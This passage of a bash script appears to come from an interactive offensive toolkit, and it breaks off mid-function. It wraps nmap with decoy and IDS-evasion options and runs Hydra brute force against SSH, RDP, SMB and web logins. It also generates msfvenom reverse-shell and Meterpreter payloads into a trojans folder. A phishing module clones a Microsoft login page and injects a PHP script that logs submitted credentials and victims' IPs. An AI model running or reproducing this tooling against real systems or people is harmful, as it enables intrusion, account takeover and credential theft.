    [[ "$os_detect" == "y" ]] && os_flag="-O" || os_flag=""
    
    local aggressive=$(read_input "Enable aggressive scan (includes -sV -O --traceroute)? (y/n): ")
    if [[ "$aggressive" == "y" ]]; then
        agg_flag="-A"
        sv_flag=""
        os_flag=""
    else
        agg_flag=""
    fi
    
    local script_scan=$(read_input "Enable script scan? (y/n): ")
    if [[ "$script_scan" == "y" ]]; then
        show_menu "Script Categories" "1) Default scripts (-sC)
2) Safe scripts (--script safe)
3) Vulnerability scripts (--script vuln)
4) All scripts (--script all)
5) Custom script (--script <name>)
0) Back to main menu"
        
        local script_choice=$(read_input "Select: ")
        [[ "$script_choice" == "0" ]] && return
        
        case $script_choice in
            1) script_flag="-sC" ;;
            2) script_flag="--script safe" ;;
            3) script_flag="--script vuln" ;;
            4) script_flag="--script all" ;;
            5) 
                local custom_script=$(read_input "Enter script name: ")
                script_flag="--script $custom_script"
                ;;
        esac
    else
        script_flag=""
    fi
    
    # Timing and performance
    show_menu "Timing & Performance" "1) Paranoid (T0) - IDS evasion
2) Sneaky (T1)
3) Polite (T2)
4) Normal (T3)
5) Aggressive (T4)
6) Insane (T5)
0) Back to main menu"
    
    local timing=$(read_input "Select timing template: ")
    [[ "$timing" == "0" ]] && return
    
    case $timing in
        1) time_flag="-T0" ;;
        2) time_flag="-T1" ;;
        3) time_flag="-T2" ;;
        4) time_flag="-T3" ;;
        5) time_flag="-T4" ;;
        6) time_flag="-T5" ;;
        *) time_flag="-T4" ;;
    esac
    
    local fragment=$(read_input "Enable fragmentation (-f)? (y/n): ")
    [[ "$fragment" == "y" ]] && frag_flag="-f" || frag_flag=""
    
    # Decoy options
    local use_decoys=$(read_input "Use decoy IPs? (y/n): ")
    local decoy_flag=""
    if [[ "$use_decoys" == "y" ]]; then
        show_menu "Decoy Options" "1) Random decoys (-D RND:10)
2) Specific decoys (-D decoy1,decoy2,...)
3) ME as last decoy (-D RND:10,ME)"
        
        local decoy_choice=$(read_input "Select decoy option: ")
        case $decoy_choice in
            1) decoy_flag="-D RND:10" ;;
            2) 
                local decoy_ips=$(read_input "Enter decoy IPs (comma-separated): ")
                decoy_flag="-D $decoy_ips"
                ;;
            3) decoy_flag="-D RND:10,ME" ;;
        esac
    fi
    
    local verbose=$(read_input "Enable verbose output (-v)? (y/n): ")
    [[ "$verbose" == "y" ]] && verb_flag="-v" || verb_flag=""
    
    local auto_save=$(read_input "Auto-save results? (y/n): ")
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    if [[ "$auto_save" == "y" ]]; then
        output_base="$RESULTS_DIR/nmap/nmap_scan_$timestamp"
        output_flag="-oA $output_base"
        echo -e "${GREEN}[+] Will save results to: $output_base.{nmap,xml,gnmap}${NC}"
    else
        output_flag=""
    fi
    
    # Set scan type flag
    case $scan_type in
        1) scan_flag="-sS" ;;
        2) scan_flag="-sT" ;;
        3) scan_flag="-sU" ;;
        4) scan_flag="-sA" ;;
        5) scan_flag="-sW" ;;
        6) 
            show_menu "Stealth Scan Type" "1) FIN (-sF)
2) NULL (-sN)
3) Xmas (-sX)
0) Back to main menu"
            local stealth_choice=$(read_input "Select: ")
            [[ "$stealth_choice" == "0" ]] && return
            
            case $stealth_choice in
                1) scan_flag="-sF" ;;
                2) scan_flag="-sN" ;;
                3) scan_flag="-sX" ;;
            esac
            ;;
        7)
            echo -e "${YELLOW}[*] Running comprehensive scan...${NC}"
            ;;
    esac
    
    # Build and execute nmap command
    local nmap_cmd="nmap $scan_flag $port_flag $sv_flag $os_flag $agg_flag $script_flag $time_flag $frag_flag $decoy_flag $verb_flag $output_flag $target"
    
    show_menu "Scan Configuration" "Command: $nmap_cmd"
    
    echo -n "Press Enter to start scan or Ctrl+C to cancel..."
    read
    
    echo -e "${YELLOW}[*] Starting scan...${NC}"
    echo -e "${CYAN}========================================${NC}"
    
    if [[ -n "$output_flag" ]]; then
        eval "$nmap_cmd"
        echo -e "${CYAN}========================================${NC}"
        echo -e "${GREEN}[+] Results saved to: $output_base.{nmap,xml,gnmap}${NC}"
    else
        local results=$(eval "$nmap_cmd" 2>&1)
        echo "$results"
        echo -e "${CYAN}========================================${NC}"
        
        # Ask to save after scan
        save_results_prompt "$results" "nmap_scan_$timestamp.txt" "nmap"
    fi
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

# Network discovery via ping sweeps
network_discovery() {
    check_install nmap
    
    show_menu "Network Discovery" "Scan a subnet for live hosts"
    
    local subnet=$(read_input "Enter target subnet (e.g., 192.168.1.0/24): ")
    [[ -z "$subnet" ]] && return
    [[ "$subnet" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    local auto_save=$(read_input "Auto-save results? (y/n): ")
    
    if [[ "$auto_save" == "y" ]]; then
        local output_file="$RESULTS_DIR/nmap/discovery_$timestamp.txt"
        nmap -sn "$subnet" -oN "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
        cat "$output_file"
    else
        local results=$(nmap -sn "$subnet" 2>&1)
        echo "$results"
        
        save_results_prompt "$results" "discovery_$timestamp.txt" "nmap"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Legacy port scanner (redirects to advanced)
port_scanner() {
    echo -e "${YELLOW}[*] Basic port scanner deprecated. Use Advanced Nmap Scanner.${NC}"
    sleep 1
    advanced_nmap_scan
}

# =============================================================================
# WIRESHARK TERMINAL CAPTURE MODULE
# =============================================================================

# Terminal-based Wireshark capture using tshark
wireshark_terminal() {
    check_install wireshark tshark
    
    show_menu "Terminal Wireshark Capture" "Capture network traffic from the command line
SPACE = Start/Stop capture (if supported)
Q = Quit and return to menu
Ctrl+C = Stop capture and exit"
    
    echo -n "Enter interface to capture on (e.g., eth0, wlan0, any): "
    read capture_iface
    [[ -z "$capture_iface" ]] && capture_iface="any"
    
    echo -n "Enter capture filter (or press Enter for none): "
    read capture_filter
    
    echo -n "Enter packet count limit (0 = unlimited): "
    read packet_count
    packet_count=${packet_count:-0}
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local cap_file="$RESULTS_DIR/nmap/wireshark_$timestamp.pcap"
    
    echo ""
    echo -e "${CYAN}=== Capture Controls ===${NC}"
    echo "SPACE - Toggle pause/resume (if terminal supports it)"
    echo "Q     - Quit and save"
    echo "Ctrl+C - Stop and save"
    echo ""
    echo -e "${YELLOW}[*] Starting capture on $capture_iface...${NC}"
    echo -e "${GREEN}[+] Saving to: $cap_file${NC}"
    echo ""
    
    # Build tshark command
    local tshark_cmd="tshark -i $capture_iface"
    [[ -n "$capture_filter" ]] && tshark_cmd="$tshark_cmd -f \"$capture_filter\""
    [[ $packet_count -gt 0 ]] && tshark_cmd="$tshark_cmd -c $packet_count"
    tshark_cmd="$tshark_cmd -w $cap_file"
    
    # Run tshark with interactive controls
    # Use script command to make it interactive
    echo -e "${CYAN}Starting capture... Press Q then Enter to quit${NC}"
    echo ""
    
    # Create a wrapper script for better control
    cat > /tmp/tshark_wrapper.sh << EOF
#!/bin/bash
echo "Capture started. Commands:"
echo "  stop - Stop capture and return to menu"
echo "  status - Show capture status"
echo ""

tshark -i $capture_iface $([[ -n "$capture_filter" ]] && echo "-f \"$capture_filter\"") $([[ $packet_count -gt 0 ]] && echo "-c $packet_count") -w $cap_file &
TSHARK_PID=\$!

# Monitor for user input
while true; do
    read -t 1 cmd
    if [[ "\$cmd" == "stop" || "\$cmd" == "q" || "\$cmd" == "Q" ]]; then
        echo "Stopping capture..."
        kill \$TSHARK_PID 2>/dev/null
        wait \$TSHARK_PID 2>/dev/null
        break
    elif [[ "\$cmd" == "status" ]]; then
        if kill -0 \$TSHARK_PID 2>/dev/null; then
            echo "Capture running (PID: \$TSHARK_PID)"
            ls -lh $cap_file 2>/dev/null && echo "File size: \$(ls -lh $cap_file | awk '{print \$5}')"
        else
            echo "Capture stopped"
        fi
    fi
    
    # Check if tshark is still running
    if ! kill -0 \$TSHARK_PID 2>/dev/null; then
        echo "Capture completed"
        break
    fi
done

echo "Capture saved to: $cap_file"
EOF
    
    chmod +x /tmp/tshark_wrapper.sh
    /tmp/tshark_wrapper.sh
    
    rm -f /tmp/tshark_wrapper.sh
    
    echo ""
    if [[ -f "$cap_file" ]]; then
        echo -e "${GREEN}[+] Capture saved: $cap_file${NC}"
        echo -e "${CYAN}[*] File size: $(ls -lh $cap_file | awk '{print $5}')${NC}"
        echo -e "${CYAN}[*] Packet count: $(tshark -r $cap_file -q 2>/dev/null | tail -1 | awk '{print $1}' || echo 'unknown')${NC}"
        
        echo -n "View capture summary? (y/n): "
        read view_summary
        if [[ "$view_summary" == "y" ]]; then
            echo ""
            echo -e "${CYAN}=== Capture Summary ===${NC}"
            tshark -r $cap_file -q 2>/dev/null | tail -20
        fi
        
        echo -n "Export to text? (y/n): "
        read export_txt
        if [[ "$export_txt" == "y" ]]; then
            tshark -r $cap_file -V > "${cap_file}.txt" 2>/dev/null
            echo -e "${GREEN}[+] Exported to: ${cap_file}.txt${NC}"
        fi
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# ENUMERATION MODULES
# =============================================================================

# SMB enumeration for Windows file shares
smb_enum() {
    check_install enum4linux-ng enum4linux-ng
    
    show_menu "SMB Enumeration" "Enumerate Windows SMB shares, users, and policies"
    
    local target=$(read_input "Enter target IP: ")
    [[ -z "$target" ]] && return
    [[ "$target" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    local auto_save=$(read_input "Auto-save results? (y/n): ")
    
    if [[ "$auto_save" == "y" ]]; then
        local output_file="$RESULTS_DIR/enumeration/smb_${target}_$timestamp.txt"
        echo -e "${YELLOW}[*] Enumerating SMB shares and users...${NC}"
        enum4linux-ng -A "$target" | tee "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    else
        echo -e "${YELLOW}[*] Enumerating SMB shares and users...${NC}"
        local results=$(enum4linux-ng -A "$target" 2>&1)
        echo "$results"
        
        save_results_prompt "$results" "smb_${target}_$timestamp.txt" "enumeration"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# LDAP/Active Directory enumeration
ldap_enum() {
    show_menu "LDAP/Active Directory Enumeration" "Query Active Directory and LDAP services"
    
    local dc_ip=$(read_input "Enter target DC IP: ")
    [[ -z "$dc_ip" ]] && return
    [[ "$dc_ip" == "99" ]] && return
    
    local domain=$(read_input "Enter domain name (e.g., corp.local): ")
    [[ "$domain" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    show_menu "LDAP Enumeration Options" "1) Anonymous LDAP bind
2) Authenticated LDAP query
3) LDAP user enumeration
4) BloodHound data collection
0) Back to main menu"
    
    local ldap_choice=$(read_input "Select option: ")
    [[ "$ldap_choice" == "0" ]] && return
    [[ "$ldap_choice" == "99" ]] && return
    
    case $ldap_choice in
        1)
            echo -e "${YELLOW}[*] Attempting anonymous LDAP bind...${NC}"
            local results=$(ldapsearch -x -H "ldap://$dc_ip" -b "dc=${domain//./,dc=}" 2>&1)
            echo "$results"
            save_results_prompt "$results" "ldap_anon_$timestamp.txt" "enumeration"
            ;;
        2)
            local ldap_user=$(read_input "Enter username: ")
            [[ "$ldap_user" == "99" ]] && return
            echo -n "Enter password: "
            read -s ldap_pass
            echo ""
            local results=$(ldapsearch -x -H "ldap://$dc_ip" -D "$ldap_user@$domain" -w "$ldap_pass" -b "dc=${domain//./,dc=}" 2>&1)
            echo "$results"
            save_results_prompt "$results" "ldap_auth_$timestamp.txt" "enumeration"
            ;;
        3)
            echo -e "${YELLOW}[*] Running user enumeration...${NC}"
            if [[ -f "$WORDLISTS_DIR/seclists/Usernames/Names/names.txt" ]]; then
                local results=$(for user in $(head -100 "$WORDLISTS_DIR/seclists/Usernames/Names/names.txt"); do
                    ldapsearch -x -H "ldap://$dc_ip" -b "dc=${domain//./,dc=}" "(cn=$user)" 2>&1 | grep -q "numEntries" && echo "[+] User found: $user"
                done)
                echo "$results"
                save_results_prompt "$results" "ldap_users_$timestamp.txt" "enumeration"
            else
                echo -e "${RED}[!] Username wordlist not found${NC}"
            fi
            ;;
        4)
            check_install bloodhound.py
            echo -e "${YELLOW}[*] Collecting BloodHound data...${NC}"
            local blood_dir="$RESULTS_DIR/enumeration/bloodhound_$timestamp"
            create_dir "$blood_dir"
            local bh_user=$(read_input "Enter username (optional, press Enter for anonymous): ")
            if [[ -n "$bh_user" && "$bh_user" != "99" ]]; then
                echo -n "Enter password: "
                read -s bh_pass
                echo ""
                bloodhound-python -d "$domain" -u "$bh_user" -p "$bh_pass" -dc "$dc_ip" -c All -o "$blood_dir"
            else
                [[ "$bh_user" == "99" ]] && return
                bloodhound-python -d "$domain" -dc "$dc_ip" -c All -o "$blood_dir" --no-pass
            fi
            echo -e "${GREEN}[+] BloodHound data saved to: $blood_dir${NC}"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# Web enumeration with directory brute forcing
web_enum() {
    check_install gobuster
    check_install nikto
    
    show_menu "Web Enumeration" "Directory brute forcing and web vulnerability scanning"
    
    local target=$(read_input "Enter target URL (e.g., http://target.com): ")
    [[ -z "$target" ]] && return
    [[ "$target" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_dir="$RESULTS_DIR/enumeration/web_$timestamp"
    
    local auto_save=$(read_input "Auto-save results? (y/n): ")
    
    if [[ "$auto_save" == "y" ]]; then
        create_dir "$output_dir"
        
        echo -e "${YELLOW}[*] Running directory brute force...${NC}"
        if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
            gobuster dir -u "$target" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
                -o "$output_dir/directories.txt" -t 50
        else
            gobuster dir -u "$target" -w "/usr/share/wordlists/dirb/common.txt" \
                -o "$output_dir/directories.txt" -t 50
        fi
        
        echo -e "${YELLOW}[*] Running Nikto scan...${NC}"
        nikto -h "$target" -o "$output_dir/nikto.txt"
        
        echo -e "${GREEN}[+] Results saved to: $output_dir${NC}"
    else
        echo -e "${YELLOW}[*] Running directory brute force...${NC}"
        local gobuster_results=$(gobuster dir -u "$target" -w "/usr/share/wordlists/dirb/common.txt" -t 50 2>&1)
        echo "$gobuster_results"
        
        echo ""
        echo -e "${YELLOW}[*] Running Nikto scan...${NC}"
        local nikto_results=$(nikto -h "$target" 2>&1)
        echo "$nikto_results"
        
        local combined_results="=== GOBUSTER RESULTS ===\n$gobuster_results\n\n=== NIKTO RESULTS ===\n$nikto_results"
        save_results_prompt "$combined_results" "web_enum_$timestamp.txt" "enumeration"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Subdomain enumeration
subdomain_enum() {
    show_menu "Subdomain Enumeration" "Discover subdomains using various techniques"
    
    local domain=$(read_input "Enter target domain (e.g., example.com): ")
    [[ -z "$domain" ]] && return
    [[ "$domain" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    show_menu "Enumeration Methods" "1) DNS brute force
2) Certificate transparency logs
3) DNS zone transfer attempt
4) All methods
0) Back to main menu"
    
    local method=$(read_input "Select method: ")
    [[ "$method" == "0" ]] && return
    [[ "$method" == "99" ]] && return
    
    local all_results=""
    
    case $method in
        1)
            echo -e "${YELLOW}[*] Running DNS brute force...${NC}"
            if [[ -f "$WORDLISTS_DIR/seclists/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
                while read sub; do
                    host "$sub.$domain" 2>/dev/null | grep "has address" &
                done < "$WORDLISTS_DIR/seclists/Discovery/DNS/subdomains-top1million-5000.txt" | head -50
                wait
            else
                for sub in www mail ftp admin portal api dev test staging; do
                    host "$sub.$domain" 2>/dev/null | grep "has address" &
                done
                wait
            fi
            ;;
        2)
            echo -e "${YELLOW}[*] Querying certificate transparency logs...${NC}"
            curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
                jq -r '.[].name_value' 2>/dev/null | sort -u | \
                grep -E "^[a-zA-Z0-9]" || echo -e "${YELLOW}[!] crt.sh query failed or jq not installed${NC}"
            ;;
        3)
            echo -e "${YELLOW}[*] Attempting zone transfer...${NC}"
            for ns in $(host -t ns "$domain" 2>/dev/null | awk '{print $4}'); do
                echo "Trying NS: $ns"
                host -l "$domain" "$ns" 2>&1 | head -20
            done
            ;;
        4)
            echo -e "${YELLOW}[*] Running all enumeration methods...${NC}"
            
            # DNS brute force
            all_results+="=== DNS BRUTE FORCE ===\n"
            for sub in www mail ftp admin portal api dev test staging shop blog; do
                local result=$(host "$sub.$domain" 2>/dev/null | grep "has address")
                [[ -n "$result" ]] && all_results+="$result\n"
            done
            
            # Certificate transparency
            all_results+="\n=== CERTIFICATE TRANSPARENCY ===\n"
            local ct_results=$(curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
                jq -r '.[].name_value' 2>/dev/null | sort -u | head -20)
            all_results+="${ct_results:-Query failed}\n"
            
            echo -e "$all_results"
            save_results_prompt "$all_results" "subdomains_$domain_$timestamp.txt" "enumeration"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# BRUTE FORCE & PASSWORD ATTACKS
# =============================================================================

# Multi-protocol brute force with Hydra
brute_force() {
    check_install hydra
    
    show_menu "Brute Force Module" "Select service to attack:
1) SSH
2) FTP
3) SMB
4) HTTP Basic Auth
5) HTTP Form POST
6) RDP
7) VNC
8) Telnet
0) Back to main menu"
    
    local choice=$(read_input "Choice: ")
    [[ "$choice" == "0" ]] && return
    [[ "$choice" == "99" ]] && return
    
    local target=$(read_input "Enter target IP: ")
    [[ -z "$target" ]] && return
    [[ "$target" == "99" ]] && return
    
    local user=$(read_input "Enter username (or 'userlist.txt' for list): ")
    [[ "$user" == "99" ]] && return
    
    local use_rockyou=$(read_input "Use rockyou.txt wordlist? (y/n): ")
    
    if [[ "$use_rockyou" == "y" ]]; then
        wordlist="$WORDLISTS_DIR/rockyou.txt"
    else
        local wordlist=$(read_input "Enter wordlist path: ")
        [[ "$wordlist" == "99" ]] && return
    fi
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    local save_output=$(read_input "Save brute force output? (y/n): ")
    
    local output_file=""
    [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/bruteforce/hydra_${target}_$timestamp.txt"
    
    case $choice in
        1)
            service="ssh"
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" "$service" -t 4 -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" "$service" -t 4
            fi
            ;;
        2)
            service="ftp"
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" "$service" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" "$service"
            fi
            ;;
        3)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" smb -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" smb
            fi
            ;;
        4)
            local path=$(read_input "Enter URL path (e.g., /admin): ")
            [[ "$path" == "99" ]] && return
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" http-get "$path" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" http-get "$path"
            fi
            ;;
        5)
            local path=$(read_input "Enter form path (e.g., /login.php): ")
            [[ "$path" == "99" ]] && return
            local user_field=$(read_input "Enter username field name: ")
            [[ "$user_field" == "99" ]] && return
            local pass_field=$(read_input "Enter password field name: ")
            [[ "$pass_field" == "99" ]] && return
            local fail_msg=$(read_input "Enter failure message (e.g., 'Invalid'): ")
            [[ "$fail_msg" == "99" ]] && return
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" http-post-form "$path:$user_field=^USER^&$pass_field=^PASS^:$fail_msg" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" http-post-form "$path:$user_field=^USER^&$pass_field=^PASS^:$fail_msg"
            fi
            ;;
        6)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" rdp://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" rdp://"$target"
            fi
            ;;
        7)
            if [[ -n "$output_file" ]]; then
                hydra -P "$wordlist" vnc://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -P "$wordlist" vnc://"$target"
            fi
            ;;
        8)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" telnet://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" telnet://"$target"
            fi
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PAYLOADS & EXPLOITATION
# =============================================================================

# Metasploit payload generator
payload_gen() {
    check_install metasploit-framework msfvenom
    
    show_menu "Payload Generator (msfvenom)" "Select payload type:
1) Linux x86 Reverse Shell
2) Linux x64 Reverse Shell
3) Windows Reverse Shell
4) Windows Meterpreter (Staged)
5) Windows Meterpreter (Stageless)
6) macOS Reverse Shell
7) Python Reverse Shell
8) PHP Reverse Shell
9) ASP.NET Reverse Shell
10) Android APK
11) Custom
0) Back to main menu"
    
    local choice=$(read_input "Choice: ")
    [[ "$choice" == "0" ]] && return
    [[ "$choice" == "99" ]] && return
    
    local lhost=$(read_input "Enter LHOST (your IP): ")
    [[ -z "$lhost" ]] && return
    [[ "$lhost" == "99" ]] && return
    
    local lport=$(read_input "Enter LPORT: ")
    [[ "$lport" == "99" ]] && return
    
    local filename=$(read_input "Enter output filename: ")
    [[ -z "$filename" ]] && return
    [[ "$filename" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_path="$TROJANS_DIR/${timestamp}_$filename"
    
    case $choice in
        1)
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output_path"
            ;;
        2)
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output_path"
            ;;
        3)
            msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
            ;;
        4)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
            ;;
        5)
            msfvenom -p windows/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
            ;;
        6)
            msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho -o "$output_path"
            ;;
        7)
            msfvenom -p cmd/unix/reverse_python LHOST="$lhost" LPORT="$lport" -o "$output_path"
            ;;
        8)
            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$output_path"
            ;;
        9)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f aspx -o "$output_path"
            ;;
        10)
            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output_path"
            ;;
        11)
            local payload=$(read_input "Enter msfvenom payload name: ")
            [[ "$payload" == "99" ]] && return
            local format=$(read_input "Enter format (elf/exe/python/psh/macho/raw): ")
            [[ "$format" == "99" ]] && return
            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output_path"
            ;;
    esac
    
    if [[ -f "$output_path" ]]; then
        echo -e "${GREEN}[+] Payload saved to: $output_path${NC}"
        echo -e "${YELLOW}[*] To start a listener, run this in another terminal:${NC}"
        echo -e "${RED}msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD <payload>; set LHOST $lhost; set LPORT $lport; exploit\"${NC}"
    else
        echo -e "${RED}[!] Payload generation may have failed${NC}"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Exploit search and information
exploit_search() {
    check_install metasploit-framework searchsploit
    
    show_menu "Exploit Database Search" "Search for exploits by service/version"
    
    local term=$(read_input "Enter search term (service/version): ")
    [[ -z "$term" ]] && return
    [[ "$term" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    local save_results=$(read_input "Save search results? (y/n): ")
    
    if [[ "$save_results" == "y" ]]; then
        local output_file="$RESULTS_DIR/exploitation/searchsploit_$timestamp.txt"
        searchsploit "$term" | tee "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    else
        searchsploit "$term"
    fi
    
    local exploit_id=$(read_input "View details of exploit? (enter ID or n): ")
    if [[ "$exploit_id" != "n" && "$exploit_id" != "N" && "$exploit_id" != "99" ]]; then
        searchsploit -x "$exploit_id"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PASSWORD CRACKING
# =============================================================================

# Hash cracking with John or Hashcat
password_crack() {
    show_menu "Password Cracking Module" "1) John the Ripper
2) Hashcat
3) Identify hash type
0) Back to main menu"
    
    local choice=$(read_input "Choice: ")
    [[ "$choice" == "0" ]] && return
    [[ "$choice" == "99" ]] && return
    
    local hashfile=$(read_input "Enter hash file path: ")
    [[ -z "$hashfile" ]] && return
    [[ "$hashfile" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    local save_output=$(read_input "Save cracking output? (y/n): ")
    
    local output_file=""
    [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/cracking/crack_$timestamp.txt"
    
    case $choice in
        1)
            check_install john
            local format=$(read_input "Enter hash format (or 'auto'): ")
            [[ "$format" == "99" ]] && return
            
            if [[ -n "$output_file" ]]; then
                if [[ "$format" == "auto" ]]; then
                    john "$hashfile" 2>&1 | tee "$output_file"
                else
                    john --format="$format" "$hashfile" 2>&1 | tee "$output_file"
                fi
                john --show "$hashfile" | tee -a "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                if [[ "$format" == "auto" ]]; then
                    john "$hashfile"
                else
                    john --format="$format" "$hashfile"
                fi
                john --show "$hashfile"
            fi
            ;;
        2)
            check_install hashcat
            local mode=$(read_input "Enter hash mode number (0 for MD5, 100 for SHA1, etc): ")
            [[ "$mode" == "99" ]] && return
            
            if [[ -n "$output_file" ]]; then
                hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force
            fi
            ;;
        3)
            echo -e "${YELLOW}[*] Analyzing hash format...${NC}"
            john --show=formats "$hashfile" 2>/dev/null || \
            hashid "$hashfile" 2>/dev/null || \
            echo "Common formats to try: 0=MD5, 100=SHA1, 1000=NTLM, 5500=NetNTLMv1, 5600=NetNTLMv2"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PHISHING TOOLS MODULE
# =============================================================================

# Phishing campaign manager
phishing_menu() {
    while true; do
        show_menu "Phishing & Social Engineering" "1) Clone Website (Credential Harvester)
2) Create Custom Phishing Page
3) Email Spoofing/Sender
4) View Captured Credentials
5) Generate QR Code Phish
6) USB Drop Attack Generator
7) Terminal Wireshark Capture
0) Back to Main Menu"
        
        local phish_choice=$(read_input "Select option: ")
        
        case $phish_choice in
            1) clone_website ;;
            2) custom_phish_page ;;
            3) email_spoofer ;;
            4) view_captured_creds ;;
            5) qr_code_phish ;;
            6) usb_drop_generator ;;
            7) wireshark_terminal ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Website cloning for credential harvesting
clone_website() {
    check_install httrack
    
    show_menu "Website Cloning Tool" "Clone a website for credential harvesting"
    
    local target_url=$(read_input "Enter target URL to clone (e.g., https://login.microsoftonline.com): ")
    [[ -z "$target_url" ]] && return
    [[ "$target_url" == "99" ]] && return
    
    local harvest_port=$(read_input "Enter local port for harvester (default 8080): ")
    [[ "$harvest_port" == "99" ]] && return
    harvest_port=${harvest_port:-8080}
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local clone_dir="$PHISHING_DIR/cloned_site_$timestamp"
    create_dir "$clone_dir"
    
    echo -e "${YELLOW}[*] Cloning website... This may take a moment.${NC}"
    httrack "$target_url" -O "$clone_dir" -v --quiet | tail -20
    
    # Find and modify login form to capture credentials
    local login_file=$(find "$clone_dir" -name "*.html" -exec grep -l "password\|login\|signin" {} \; 2>/dev/null | head -1)
    
    if [[ -n "$login_file" ]]; then
        echo -e "${GREEN}[+] Found potential login page: $login_file${NC}"
        local modify_form=$(read_input "Modify form to capture credentials? (y/n): ")
        
        if [[ "$modify_form" == "y" ]]; then
            # Create PHP capture script
            cat > "$clone_dir/capture.php" << 'PHPEOF'
<?php
$timestamp = date('Y-m-d H:i:s');
$data = "[$timestamp] ";
foreach($_POST as $key => $value) {
    $data .= "$key=$value; ";
}
$data .= "IP=".$_SERVER['REMOTE_ADDR']."\n";
file_put_contents('captured_creds.txt', $data, FILE_APPEND);
header('Location: https://login.microsoftonline.com'); // Redirect to real site
?>
PHPEOF
            
            # Modify HTML form to POST to capture.php
            sed -i 's/<form[^>]*>/<form action="capture.php" method="POST">/i' "$login_file"
            sed -i 's/https:\/\/login.microsoftonline.com/\./g' "$login_file" 2>/dev/null || true
            
            echo -e "${GREEN}[+] Form modified to capture credentials${NC}"
        fi
    fi
    
    echo -e "${YELLOW}[*] Starting PHP server on port $harvest_port...${NC}"
